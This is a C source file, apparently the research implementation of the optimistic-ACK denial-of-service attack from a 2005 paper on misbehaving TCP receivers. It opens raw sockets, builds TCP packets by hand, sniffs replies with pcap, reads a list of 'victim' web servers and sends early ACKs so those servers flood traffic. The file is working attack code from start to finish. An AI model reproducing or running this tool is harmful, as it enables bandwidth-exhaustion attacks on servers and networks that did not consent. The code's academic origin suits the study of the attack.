/*********************************************************************
 * 	OPTACK DoS - Rob Sherwood <capveg@cs.umd.edu> '05
 * 	Implementation of the CCS2005 
 * 	"Misbehaving TCP Receivers Can Cause Internet-Wide Congestion Collapse"
 * 	attack/paper
 *
 * 		DO NOT DISTRIBUTE!
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>

#include "optack.h"




/*************************************************************************************************
 * void usage(char *, char*);
 * 	print a usage msg and exit
 * 	optack [-d] [-w wscale] [-m mss] [-e efficency] [-t usWait] [-l bandwidth] <-f victims>
 */

void usage(char * s1, char* s2)
{
	if(s1)
		fprintf(stderr,"%s",s1);
	if(s2) 
		fprintf(stderr,": %s",s2);
	if(s1||s2)
		fprintf(stderr,"\n");
	fprintf(stderr,"optack\n"
			"\t[-d]	don't reconnect \n"
			"\t[-w wscale] (%d)\n"
			"\t[-m mss] (%d)\n"
			"\t[-e efficiency] (%f)\n"
			"\t[-t usWait] (%d)\n"
			"\t[-l bandwidth] b/s (%d)\n"
			"\t<-f victimsFile>\n",
			WSCALE,MSS,EFFICIENCY,USWAIT,BANDWIDTH);
	exit(0);
}

/**********************************************************************************************
 * main():
 * 	does stuff
 */

int main(int argc, char * argv[]){
	context * ctx;
	ctx= parseArgs(argc,argv);   // will exit if error
	readVictimsFile(ctx);	// read in all victims
	init(ctx);
	return optack(ctx);	// run attack
}

/*************************************************************************
 * init(): 	
 * 	initialize lotsa params in the context
 */

void init(context *ctx)
{
	int i;
	victiminfo *v;
	struct protoent *pr;

	ctx->localIP = getLocalIP();
	ctx->pcap_handle=init_pcap(ctx);
	pthread_create(&ctx->packetGrabberThread,NULL,packetGrabber,ctx);
	srand(time(NULL));
	ctx->rawSock = socket(PF_INET, SOCK_RAW,IPPROTO_TCP); // tcp
	if(ctx->rawSock == -1 ){
		perror("ERR: socket");
		exit(-1);
	}
	if ((pr = getprotobyname("tcp")) == NULL)
	{
		fprintf(stderr,"Failed to lookup protocol tcp : exiting\n");
		perror("getprotobyname");
		exit(1);
	}
			

	for(i=0;i<ctx->nVictims;i++)
	{
		v = ctx->victims[i];
		v->state=UNCONNECTED;
		errno=0;
	}
	ctx->usDelay = (double) (54 * ctx->nVictims) / (double) ctx->localBandwidth;	// calc delay between ACKs sent
}

/***************************************************************************************************
 * int addToLookupHash(context *ctx, victiminfo *v);
 * 	add victim to fast lookup hash
 */
int addToLookupHash(context *ctx, victiminfo *v)
{
	int index = lookupVictimHash(ctx,ctx->localIP,v->dstIP,v->srcPort,v->dstPort);
	assert((index>=0)&&(index<HASHBUCKETS));
	v->next=ctx->lookupHash[index];
	ctx->lookupHash[index]=v;
	return 0;
}



/************************************************************************
 * optact(context *ctx)
 * 	actual attack loop
 */


int optack(context *ctx)
{
	int i;
	victiminfo * v;
	char buf[BUFLEN];
	int shouldDelay;
	struct timeval roundTime,sendTime;
	while(!ctx->shouldStop)		// continue until outside input
	{
		gettimeofday(&roundTime,NULL);
		for(i=0;i<ctx->nVictims;i++)
		{
			gettimeofday(&sendTime,NULL);
			v = ctx->victims[i];
			shouldDelay=1;
			switch(v->state)
			{
				case UNCONNECTED:
					// start new connection
					v->srcPort=(rand()%(65536-1024))+1024; // random high port
					v->localSeq= rand();			// random init seq for us
					printf("Attacking victim %d: %s :: %s:%d(%x) on port %u : GET %s %d bytes\n",
							i,
							v->hostStr,
							inet_ntop(AF_INET,&v->dstIP,buf,BUFLEN),v->dstPort,htonl(v->dstPort),
							v->srcPort,
							v->fileStr, v->fileSize);
					addToLookupHash(ctx,v);
					sendSyn(ctx,v);
					v->state=SYNSENT;
					break;
				case SYNSENT:
					shouldDelay=0;	// just waiting for SYNACK from victim, do nothing
					break;
				case GOTSYNACK:
					v->lastAck++;	// inc the seq space for the SYN
					sendAck(ctx,v);
					v->state=CONNECTED;
					break;
				case CONNECTED:
					sendAppGet(ctx,v);	// send the GET command
					v->state=ATTACKING;
					v->fileStartSeq=v->lastAck;
					break;
				case ATTACKING:
					sendOptAck(ctx,v);	// where all of the work is
					break;
				case RECOVER:
					sendRecoverAck(ctx,v);
					v->state=ATTACKING;
					break;
				default:
					fprintf(stderr,"Unknown state %d for victim %d; aborting\n",v->state,i);
					abort();
			};
			if(shouldDelay)
				myWaitUntil(sendTime,ctx->usDelay);	// delay some amount time as a func of local bandwidth
		}
		myWaitUntil(roundTime,ctx->minUSPerRound);
	}
	printf("Exiting normally\n");
	return 0;
}



/************************************************************************************
 * sendSyn(ctx,v):
 * 	send the initial Syn to victim v
 */

int sendSyn(context * ctx, victiminfo *v)
{
	int err;
	struct tcphdr *tcp;
	struct pseudohdr * pseudo;
	u8  packet[BUFLEN];
	struct sockaddr_in sin;
	int packetsize;
	u8 * options;

	pseudo = (struct pseudohdr *) packet;
	packetsize=sizeof(struct tcphdr)+8;     // 8 bytes of options
	assert((packetsize%4)==0);              // packetsize MUST be multiple of 4
	memset(pseudo,0, sizeof(struct pseudohdr));
	pseudo->s_addr =ctx->localIP;
	pseudo->d_addr = v->dstIP;
	pseudo->zero = 0;
	pseudo->proto = IPPROTO_TCP;
	pseudo->length = htons(packetsize);
	tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
	memset(tcp,0,sizeof(struct tcphdr));
	tcp->source = htons(v->srcPort);
	tcp->dest = htons(v->dstPort);
	tcp->seq = htonl(v->localSeq);
	tcp->doff = packetsize/4;               // no byte conversion; single byte
	tcp->syn = 1;
	tcp->window = htons(ctx->defaultRecvWindow);    // default window
	options = (u8 *) ((u8*)tcp+sizeof(struct tcphdr));
	options[0] = 2;         // MSS KIND
	options[1] = 4;         // MSS length
	*(short *)&options[2] = htons(ctx->mss);     // set MSS
	options[4] = 3;         // WSCALE kind
	options[5] = 3;         // WSCALE length
	options[6] = ctx->wscale;
	options[7] = 1;         // NOOP



	tcp->check = in_cksum((unsigned short *) packet,
			packetsize+sizeof(struct pseudohdr));
	//printf("Tcp checksum: %u\n",tcp->check);
	sin.sin_addr.s_addr = v->dstIP;
	sin.sin_port = IPPROTO_TCP;
	sin.sin_family = AF_INET;

	/* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock­
	 *          *        addr *to, socklen_t tolen);
	 *                   */

	err = sendto(ctx->rawSock, tcp, packetsize,
			MSG_DONTWAIT, (struct sockaddr *)& sin, sizeof(sin));
	if(err<packetsize){
		perror("ERR: sendSYN: sento");
		return err;
	}

	return 0;
}

/***************************************************************************************
 * in_chksum(..)
 * 	compute the check sum of the packet; snagged from nmap - who writes
 * 	these things themselves?
 */

/* Standard BSD internet checksum routine  -- snagged from nmap*/
unsigned short in_cksum(u16 *ptr,int nbytes) {

	register u32 sum;
	u16 oddbyte;
	register u16 answer;

	/*
	 *         for(i=0;i<nbytes/2;i++)
	 *                         printf("%d: 0x%.4X : %u : %u\n",i,ptr[i], ptr[i], ntohs(ptr[i]));
	 *                                         */

	/*
	 *          *  * Our algorithm is simple, using a 32-bit accumulator (sum),
	 *                   *   * we add sequential 16-bit words to it, and at the end, fold back
	 *                            *    * all the carry bits from the top 16 bits into the lower 16 bits.
	 *                                     *     */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;            /* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	 *          *  * Add back carry outs from top 16 bits to low 16 bits.
	 *                   *   */
	while (sum>>16)
		sum = (sum & 0xffff) + (sum >> 16);
	answer = ~sum;          /* ones-complement, then truncate to 16 bits */
	return(answer);
}

/**************************************************************************************
 * sendAppGet(ctx,v):
 * 	send the application level request for the file; right now only assumes HTTP
 */

int sendAppGet(context *ctx, victiminfo *v)
{
	int err;
	struct tcphdr *tcp;
	struct pseudohdr * pseudo;
	u8 packet[BUFLEN];
	struct sockaddr_in sin;
	char data[BUFLEN];
	int count;
	int offset;

	count = snprintf(data,BUFLEN,"GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",v->fileStr,v->chostStr==NULL?v->hostStr:v->chostStr);

	pseudo = (struct pseudohdr *) packet;
	memset(pseudo,0, sizeof(struct pseudohdr));
	pseudo->s_addr =ctx->localIP;
	pseudo->d_addr = v->dstIP;
	pseudo->zero = 0;
	pseudo->proto = IPPROTO_TCP;
	pseudo->length = htons(sizeof(struct tcphdr)+count);
	tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
	memset(tcp,0,sizeof(struct tcphdr));
	tcp->source = htons(v->srcPort);
	tcp->dest = htons(v->dstPort);
	tcp->seq = htonl(v->localSeq);
	tcp->ack_seq = htonl(v->lastAck);
	tcp->doff = 5; // no optiond in this packet
	tcp->ack = 1;
	tcp->psh= 1;
	tcp->window = htons(ctx->defaultRecvWindow);      // default window


	offset = sizeof(struct tcphdr)+sizeof(struct pseudohdr);
	memcpy(packet + offset, data,count);    // put the data into place
	tcp->check = in_cksum((unsigned short *) packet,offset+count);
	sin.sin_addr.s_addr = v->dstIP;
	sin.sin_port = IPPROTO_TCP;
	sin.sin_family = AF_INET;

	/* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock
	 *          *        addr *to, socklen_t tolen);
	 *                   */

	err = sendto(ctx->rawSock, tcp, sizeof(struct tcphdr)+count,
			0, (struct sockaddr *)& sin, sizeof(sin));
	v->localSeq+=count;		// update our sequence space
	if(err<sizeof(struct tcphdr)){
		perror("ERR: sendSYN: sento");
		return err;
	}

	v->localSeq+=count+1;
	return 0;
}


/***********************************************************************************************
 * int sendOptAck(context *, victiminfo *);
 * 	figure out what the next Ack in the sequence should be and send it
 */

int sendOptAck(context *ctx, victiminfo *v)
{
	assert(v);
	assert(ctx);
	v->lastAck += ((int)MAX(1,(v->congwindow/ctx->mss)*ctx->efficiency))*ctx->mss;	// ACK 'efficency' percent of the current window
										// make sure we Ack a multiple of the mss
	if((v->lastAck-v->fileStartSeq)>v->fileSize)	// are we are end of file? : FIXME: add wrap protection
	{
		v->lastAck=v->fileStartSeq+v->fileSize;
		v->state=CONNECTED;	// force a resend of the AppGet()
		fprintf(stderr,"sendOptAck: resending AppGet() for %s:%d\n",v->hostStr,v->dstPort);
	}
	sendAck(ctx,v);		// actually send the Ack
	if(v->slowstart)
	{
		v->congwindow+=ctx->mss;
		if(v->congwindow>=v->ssthresh)
			v->slowstart=0;
	} 
	else
	{
		v->congwindow+=MAX(1,(ctx->mss*ctx->mss)/v->congwindow);			// when we are in CC, inc by mss/nsegments in window
	}
	return 0;
	// FIXME should have an upper limit on congwindow
	// Should also detect FileSize and reset to CONNECTED state
}

/**********************************************************************************************
 * sendAck(context *ctx, victiminfo *v)
 * 	actually send the Ack listed in the lastAck field of v
 */

int sendAck(context *ctx, victiminfo *v)
{
	int err;
	struct tcphdr *tcp;
	struct pseudohdr * pseudo;
	u8 packet[BUFLEN];
	struct sockaddr_in sin;

	pseudo = (struct pseudohdr *) packet;
	memset(pseudo,0, sizeof(struct pseudohdr));
	pseudo->s_addr =ctx->localIP;
	pseudo->d_addr = v->dstIP;
	pseudo->zero = 0;
	pseudo->proto = IPPROTO_TCP;
	pseudo->length = htons(sizeof(struct tcphdr));
	tcp = (struct tcphdr *) (packet + sizeof(pseudohdr));
	memset(tcp,0,sizeof(struct tcphdr));
	tcp->source = htons(v->srcPort);
	tcp->dest = htons(v->dstPort);
	tcp->seq = htonl(v->localSeq);
	tcp->ack_seq = htonl(v->lastAck);
	tcp->doff = 5; // figure out options size
	tcp->ack = 1;
	tcp->window = htons(ctx->defaultRecvWindow);      // default window



	tcp->check = in_cksum((unsigned short *) packet,
			sizeof(struct tcphdr)+sizeof(struct pseudohdr));
	sin.sin_addr.s_addr = v->dstIP;
	sin.sin_port = IPPROTO_TCP;
	sin.sin_family = AF_INET;

	/* int  sendto(int  s, const void *msg, size_t len, int flags, const struct sock
	 *          *        addr *to, socklen_t tolen);
	 *                   */

	err = sendto(ctx->rawSock, tcp, sizeof(struct tcphdr),
			0, (struct sockaddr *)& sin, sizeof(sin));
	if(err<sizeof(struct tcphdr)){
		perror("ERR: sendAck: sendto");
		return err;
	}

	return 0;
}
/************************************************************************************************8
 * getLocalIP():
 * 	return the IP of the local machine
 */

unsigned int getLocalIP(){
	struct hostent h, *hptr;
	char tmpbuf[BUFLEN];
	char localFQHN[BUFLEN];
	int err;
	unsigned int ret;

	assert(!gethostname(localFQHN,BUFLEN));
	gethostbyname_r(localFQHN, &h, tmpbuf, BUFLEN, &hptr, &err);
	assert(hptr != NULL);
	memcpy(&ret, hptr->h_addr, sizeof(ret));
	return ret;
}

/***************************************************************************************************
 * init_pcap()
 * 	open pcap on the specified interface, and return a pcap handle
 */

pcap_t * init_pcap(context * ctx){
	char errbuf[PCAP_ERRBUF_SIZE];
	char * dev;
	pcap_t *handle;
	bpf_u_int32 mask=0, net=0;
	struct bpf_program filter;
	char filterstr[BUFLEN];
	char tmpbuf[BUFLEN];


	dev = ctx->dev;
	memset(errbuf,0,PCAP_ERRBUF_SIZE);
	if(!dev)
		dev = pcap_lookupdev(errbuf);
	if(!dev){
		fprintf(stderr,"ER: pcap_lookupdev: %s\n",errbuf);
		exit(1);
	}
	ctx->dev=strdup(dev);

	if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1){
		fprintf(stderr,"ER: pcap_lookupnet: %s; ",errbuf);
		exit(1);
	}
	fprintf(stderr,"Listening on Device: %s\n", dev);

	handle = pcap_open_live(dev, MYSNAPLEN, 1, 0, errbuf);
	if(!handle){
		fprintf(stderr,"ER: pcap_open_live: %s\n",errbuf);
		exit(3);
	}

	// use PCap's filtering...but we will do most of it by hand in the packetGrabber
	snprintf(filterstr,BUFLEN,"dst host %s and tcp ",
			inet_ntop(AF_INET,&ctx->localIP,tmpbuf,BUFLEN));
	fprintf(stderr,"pcap filter: using %s\n",filterstr);
	if(pcap_compile(handle,&filter,filterstr,1,net)==-1){
		fprintf(stderr,"ER: pcap_compile: %s\n",errbuf);
		exit(4);
	}

	if(pcap_setfilter(handle,&filter ) == -1){
		fprintf(stderr,"ER: pcap_setfilter: %s\n",errbuf);
		exit(5);
	}

	assert(pcap_datalink(handle)==DLT_EN10MB);      // currently don't handle non-ethernet people

	return handle;
}
/*****************************************************************************************************
 * int myWaitUntil(struct timeval t, long usDelay);
 * 	wait until time t + usDelay
 * 		this is tricky, b/c the OS can efficiently wait for only time MINDELAY,
 * 		and usDelay is typically shorter than that.  So, if the time between now and stop
 * 		is less than MINDELAY, then busy wait, else use nanosleep()
 */

int myWaitUntil(struct timeval t, long usDelay)
{
	struct timeval stop,now;
	long diff;
	// calc stop time
	stop.tv_sec = t.tv_sec;
	stop.tv_usec = t.tv_usec + usDelay;
	if(stop.tv_usec> 1000000)
	{
		stop.tv_sec++;
		stop.tv_usec-=1000000;
	}
	gettimeofday(&now,NULL);
	// calc diff between stop and now
	diff = stop.tv_usec - now.tv_usec;
	if(diff<0)
	{
		diff += 1000000;
		assert(diff>0);
		now.tv_sec++;
	}
	diff += (stop.tv_sec - now.tv_sec)*1000000;
	if(diff > MINDELAY)
	{	// OS can handle this amount of delay; do nanosleep()
		struct timespec ts;
		ts.tv_nsec = (diff % 1000000)*1000;
		diff -= diff % 1000000;
		diff/=1000000;
		ts.tv_sec = diff;
		nanosleep(&ts,NULL);
		return 0;	
	}
	// else busy wait
	while(timercmp(&stop,&now,<) < 1)		//timercmp is a macro in time.h
		gettimeofday(&now,NULL);
	return 0;
}

/*********************************************************************************************************
 * int sendRecoverAck(context *, victiminfo *);
 * 	we have recieved duplicate segments, which means we over ran the victim, so 
 * 	init the recover steps, specifically:
 * 		1) restart slowstart
 * 		2) send congwindow = mss
 * 		3) ack the last segment we got, and change the lastAck field
 */

int sendRecoverAck(context * ctx, victiminfo *v)
{
	v->slowstart=1;
	v->ssthresh=v->congwindow/2;
	v->congwindow=ctx->mss;
	v->lastAck=v->lastSegmentReceived;
	sendAck(ctx,v);
	return 0;
}

/****************************************************************************************************88
 * inline int lookupVictimHash(ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort);
 * 	return an int in [0,HASHBUCKETS) semi-randomly as a function of the params
 * 	i.e., just X0R all 16 bits chunks together
 */
inline int lookupVictimHash(context * ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort)
{
	assert(HASHBUCKETS==65536);
	unsigned short ret;
	ret = dstPort ^ srcPort^ ((srcIP&0xffff0000)>>16) ^ (srcIP&0x0000ffff)
		^ ((dstIP&0xffff0000)>>16) ^ (dstIP&0x0000ffff);
	// fprintf(stderr,"lookupVictimHash: %u:%u %u:%u :: %d\n",srcIP,srcPort,dstIP,dstPort,ret);
	return ret;
}

/*****************************************************************************************************
 * victiminfo * lookupVictim(ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort);
 * 	lookup a connection based on the (srcIP,srcPort),(dstIP,dstPort) tupple
 */

victiminfo * lookupVictim(context * ctx,u32 srcIP, u32 dstIP,u16 srcPort, u16 dstPort)
{
	victiminfo *v;
	int index = lookupVictimHash(ctx,srcIP,dstIP,srcPort,dstPort);
	v = ctx->lookupHash[index];
	while(v!=NULL)
	{
		if(v->dstIP==dstIP && v->dstPort == dstPort && v->srcPort==v->srcPort && ctx->localIP==srcIP)
			return v;
		else
			v = v->next;
	}
	return NULL;		// not found
}


/****************************************************************************************************
 * void * packetGrabber(void *contextArg)
 * 	threaded function that just calls pcap_loop()
 */
void * packetGrabber(void *contextArg)
{
	context *ctx = contextArg;
	pcap_loop(ctx->pcap_handle,-1,pcap_packetgrabber,(u_char *)ctx);		// loop forever grabbing packets
	return NULL;
}


/******************************************************************************************************
 * void pcap_packetgrabber(u_char *, const struct pcap_pkthdr *, const u_char *);
 *
 * 	this is a thread that runs in the background, grabbing packets from pcap(), and
 * 	dispatching info to the sending process:
 * 		1) if a packet is not from a victim connection, ignore it
 * 			else set lastSegmentReceived
 * 		2) if a packet is for a victim in SYNSENT and has the SYN bit sent, 
 * 			change state to GOTSYNACK
 * 		3) if victim is in ATTACKING state, check for recovery and FIN/RST bits
 * 			if FIN/RST, set UNCONNECTED, if recover, set RECOVERING
 */

void pcap_packetgrabber(u_char *contextArg, const struct pcap_pkthdr *phdr, const u_char * raw)
{
	context *ctx = (context*) contextArg;
	struct iphdr *ip;
	struct tcphdr *tcp;
	u32 seg;
 	victiminfo *v;
	if(ctx->shouldStop)
	{
		pcap_breakloop(ctx->pcap_handle);
		return;
	}
	if(phdr->caplen < 40)
	{
		fprintf(stderr,"Short packet - read %d bytes :: skipping\n", phdr->caplen);
		return;
	}
	ip  = (struct iphdr *)(raw+14);	// 14 == ethernet header
	tcp = (struct tcphdr *)(raw + 14 +20);	// ether + ip header
	v = lookupVictim(ctx,ip->daddr,ip->saddr,ntohs(tcp->dest),ntohs(tcp->source));
	if(v==NULL)		// packet not meant for us
		return;
	seg = ntohl(tcp->seq)+(ip->tot_len-20-(tcp->doff*4));	// last byte of the segment
	switch(v->state)
	{
		case UNCONNECTED:
		case CONNECTED:
		case RECOVER:
			return;		// ignore these packets
		case SYNSENT:
			if(!(tcp->syn&&tcp->ack))	// ignore non-SYN-ACKs
				return;		
			v->state=GOTSYNACK;
			v->lastSegmentReceived=seg;
			v->localSeq++;
			v->lastAck=ntohl(tcp->seq);
			return;
		case ATTACKING:
			if((seg<=v->lastSegmentReceived)&&((seg - v->congwindow)>v->lastSegmentReceived))	// did we over run w/o wrapping?
			{
				fprintf(stderr,"Connection with victim %s:%d %s overrun; recovering\n",
						v->hostStr,v->dstPort,v->fileStr);
				v->state=RECOVER;
			}
			v->lastSegmentReceived=seg;
			if(tcp->rst||tcp->fin)	// reset connection if we get these
			{
				if(ctx->dontReconnect)
					ctx->shouldStop=1;
				v->state=UNCONNECTED;
				delFromLookupHash(ctx,v);
			}
			return;
		default:
			fprintf(stderr,"pcap_packetgrabber:: unknown state %d\n",v->state);
			abort();
	};
}

/*****************************************************************************************************
 * int delFromLookupHash(context *ctx, victiminfo *v);
 * 	remove connection from hash
 */
int delFromLookupHash(context *ctx, victiminfo *v)
{
	victiminfo * tmp,*prev;
	int index = lookupVictimHash(ctx,ctx->localIP,v->dstIP,v->srcPort,v->dstPort);
	tmp = ctx->lookupHash[index];
	prev=NULL;
	while(tmp)
	{
		if((tmp->dstIP==v->dstIP)&&(tmp->srcPort==v->srcPort)&&(tmp->dstPort==v->dstPort))
			break;
		prev=tmp;
		tmp=tmp->next;
	}
	assert(tmp!=NULL);		// tried to del something that didn't exist
	if(prev!=NULL)
		prev->next=tmp->next;
	else
		ctx->lookupHash[index]=tmp->next;
	// victiminfo struct will get reused, so don't free() it
	return 0;
}


/******************************************************************************************************
 * context * parseArgs(int, char **);
 * 	parse the args, put them in the context, return it
 *
 */
context * parseArgs(int argc, char **argv)
{
	context * ctx  = defaultContext();
	int c;
	while((c=getopt(argc, argv,"dw:m:e:t:l:f:"))!=EOF)
	{
		switch(c)
		{
			case 'd':
				ctx->dontReconnect=1;
				break;
			case 'w':
				ctx->wscale=atoi(optarg);
				if((ctx->wscale<0)||(ctx->wscale>14))
					usage("bad wscale value",optarg);
				break;
			case 'm':
				ctx->mss=atoi(optarg);
				if(ctx->mss<0)
					usage("bad mss value",optarg);
				break;
			case 'e':
				ctx->efficiency = atof(optarg);
				if((ctx->efficiency<0)||(ctx->efficiency>1))
					usage("bad efficiency value",optarg);
				break;
			case 't': 
				ctx->minUSPerRound=atol(optarg);
				if(ctx->minUSPerRound<0)
					usage("bad msWait value",optarg);
				break;
			case 'l':
				ctx->localBandwidth=atol(optarg);
				if(ctx->localBandwidth<0)
					usage("local bandwidth must be possitive",optarg);
				break;
			case 'f':
				ctx->victimFile=strdup(optarg);
				break;
			default:
				usage("unknown arg",(char *) &optopt);
		};
	}
	return ctx;
}

/*******************************************************************************************
 * context * defaultContext();
 * 	create a default set of stuff for things
 */

context * defaultContext()
{
	context * ctx = malloc (sizeof(struct context));
	ctx->nVictims=-1;
	ctx->efficiency=EFFICIENCY;
	ctx->minUSPerRound=USWAIT;	// 50 ms
	ctx->victimFile=NULL;
	ctx->localBandwidth=BANDWIDTH;	
	ctx->defaultRecvWindow = 65535;
	ctx->mss = MSS;
	ctx->wscale = WSCALE;
	ctx->shouldStop=0;
	ctx->dev=NULL;
	memset(ctx->lookupHash,0,sizeof(struct victiminfo *)*HASHBUCKETS);

	return ctx;
}
/*******************************************************************************************
 * int readVictimsFile(context *);
 * 	opens the file listed in context and parses through the file 
 * 	format:
 * 		# Hash is the comment character
 * 		URL	FILESIZE
 * 		URL	FILESIZE
 */

int readVictimsFile(context * ctx)
{
	FILE * in;
	victiminfo *head,*v;
	char buf[BUFLEN];
	int linecount=0;
	struct hostent *h;
	int i,err;
	head=NULL;
	assert(ctx);
	if(ctx->victimFile==NULL)
		usage("Need to specify a file with -f ",NULL);

	in = fopen(ctx->victimFile,"r");
	if(in==NULL)
	{
		fprintf(stderr,"readVictimsFile:: openning %s\n",ctx->victimFile);
		perror("fopen");
		exit(1);
	}
	ctx->nVictims=0;
	while(fgets(buf,BUFLEN,in)!=NULL)
	{
		linecount++;
		if(buf[0]=='#')
			continue;		// skip comments
		v = malloc(sizeof(victiminfo));
		assert(v);
		if((err=parseVictimLine(ctx,v,buf,BUFLEN)))
		{
			fprintf(stderr,"Exiting: err=%d Bad victim line at %s:%d  :: %s\n",err,ctx->victimFile,linecount,buf);
			exit(1);
		}
		h = gethostbyname(v->hostStr);
		if(h == NULL){
			fprintf(stderr,"DNS for Host %s at %s:%d not found\n",v->hostStr,ctx->victimFile,linecount);
			exit(2) ;
		}
		memcpy((char *) &v->dstIP,h->h_addr,h->h_length);
		assert(v->hostStr);
		// free(v->hostStr);
		// v->hostStr=strdup(h->h_name);	// stick with the given name instead of the cannonical one;
		// 					// otherwise virtual hosting stuff gets screwed

		v->state=UNCONNECTED;
		v->congwindow=ctx->mss;
		v->slowstart=1;
		v->ssthresh=65535;
		v->next=head;
		head=v;
		ctx->nVictims++;
	}
	ctx->victims = malloc(sizeof(victiminfo *)*ctx->nVictims);
	assert(ctx->victims);
	i=0;
	while(head!=NULL)
	{
		ctx->victims[i++]=head;
		v=head;
		head=head->next;
		v->next=NULL;
	}
	assert(i==ctx->nVictims);
	return 0;
}

/****************************************************************************************************
 * int parseVictimLine(context * ctx,victiminfo * v,char *buf,int len);
 * 	"http:://host[:port]/file size cname" --> parse into v
 */

int parseVictimLine(context * ctx,victiminfo * v,char *line,int len)
{

	char buf[BUFLEN];
	char *token;
	char *port,*file,*size,*hname;
	assert(v);
	assert(ctx);
	strncpy(buf,line,MIN(len,BUFLEN)-1);
	token= strtok(buf,"/"); // non-reentrant one is okay, b/c single thread
	if(!token || strcmp(token,"http:"))
	{
		fprintf(stderr,"url must start with http://.../, got: %s",token);
		return 1;
	}
	token = strtok(NULL,"/");
	if(!token || !strcmp(token,""))
		usage("Malformed url at pass 2:",token);
	file = strtok(NULL," \t");
	if(!file || !strcmp(file,""))
		usage("Malformed url at pass 3:",token);
	size = strtok(NULL," \t");
	if(!size || !strcmp(size,""))
		usage("Missing size param at pass 4:",token);
	hname = strtok(NULL," \t");
	port = index(token,':');
	if(port){
		*port = 0;
		port++;
		v->dstPort = atoi(port);
	} else {
		v->dstPort = 80;
	}
	if(hname)
		v->chostStr=strdup(hname);
	else 
		v->chostStr=NULL;
	v->hostStr=strdup(token);
	file--;	// bad parsing hack
	file[0]='/';
	v->fileStr=strdup(file);
	v->fileSize=atol(size);

	return 0;
}



